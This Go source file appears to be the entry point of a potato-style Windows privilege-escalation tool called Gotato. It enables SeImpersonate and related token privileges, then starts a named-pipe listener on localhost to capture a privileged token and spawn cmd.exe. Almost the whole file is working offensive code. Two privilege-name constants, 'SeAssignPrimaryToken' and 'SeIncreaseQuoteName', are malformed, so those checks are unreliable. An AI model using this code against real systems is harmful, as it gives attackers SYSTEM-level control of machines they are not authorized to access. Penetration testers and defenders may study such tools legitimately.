package main

import (
	"fmt"
	"strconv"

	"golang.org/x/sys/windows"
)

const (
	SE_IMPERSONATE          = "SeImpersonatePrivilege"
	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
	SE_INCREASE_QUOTE_NAME  = "SeIncreaseQuoteName"
	CREATE_NEW_CONSOLE      = 0x00000010
	SecurityImpersonation   = 0x00000002
	program                 = "C:\\Windows\\System32\\cmd.exe"
	args                    = ""
)

func enablePrivilege(securityEntity string) bool {
	var luid windows.LUID
	var token windows.Token
	err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(securityEntity), &luid)

	if err != nil {
		return false
	}

	handle, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}

	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}

	tokenPrivs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tokenPrivs, 1024, nil, nil)
	if err != nil || windows.GetLastError() != nil {
		return false
	}

	return true
}

func main() {
	fmt.Println("[+] Checking privileges")
	canImpersonate := enablePrivilege(SE_IMPERSONATE)
	canAssignPrimaryToken := enablePrivilege(SE_ASSIGN_PRIMARY_TOKEN)
	canIncreaseQuoteName := enablePrivilege(SE_INCREASE_QUOTE_NAME)

	fmt.Println("[+] SeImpersonate " + strconv.FormatBool(canImpersonate))
	fmt.Println("[+] SeAssignPrimaryToken " + strconv.FormatBool(canAssignPrimaryToken))
	fmt.Println("[+] SeIncreaseQuoteName " + strconv.FormatBool(canIncreaseQuoteName))

	if !canImpersonate && !canAssignPrimaryToken {
		fmt.Println("[!] Missing necessary privileges")
		return
	}

	gotatoAPI := GotatoAPI{
		Port: 4449,
		Host: "localhost",
		Mode: MODE_NAMED_PIPE,
	}

	gotatoAPI.Listen()
}
